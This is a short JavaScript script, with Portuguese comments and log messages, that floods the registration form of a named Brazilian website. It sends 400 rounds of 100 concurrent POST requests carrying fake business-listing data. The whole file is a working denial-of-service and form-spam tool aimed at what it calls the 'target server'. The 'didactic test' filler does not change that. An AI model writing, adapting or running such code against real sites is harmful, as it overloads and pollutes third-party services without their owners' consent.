
const MAX_REQUESTS = 100;
const TOTAL_ROUNDS = 400; 
const DELAY_BETWEEN_ROUNDS = 1000; 


async function requestSite() {
    try {
        const response = await fetch("https://sitedemonte.com.br/cadastrar/cadastrar_send.asp", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: "nome=testedidatico&proprietario=testedidatico&razao_social=MinhaEmpresa&cnpj=12345678&endereco=Rua X&numero=100&bairro=Centro&cidade=São Paulo&cep=01010101&fone1=11999999999&fone2=11888888888&email=teste@gmail.com&site=www.teste.com&descricao=Essa é uma descrição de teste.&destaque=sim"
        });
        if (!response.ok) throw new Error(`Erro: ${response.status}`);
        const text = await response.text();
        console.log('Formulario enviada com sucesso', text);
    } catch (error) {
        console.error('Erro no servidor alvo:', error);
    }
}

async function flood() {
    for (let round = 0; round < TOTAL_ROUNDS; round++) {
        console.log(` Rodada ${round + 1} - Enviando ${MAX_REQUESTS} REQ`);
        
        const requests = Array.from({ length: MAX_REQUESTS }, requestSite);
        await Promise.all(requests);

        console.log(`Rodada ${round + 1} concluída`);
        await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_ROUNDS)); 
    }

    console.log('Teste finalizado');
}

flood();
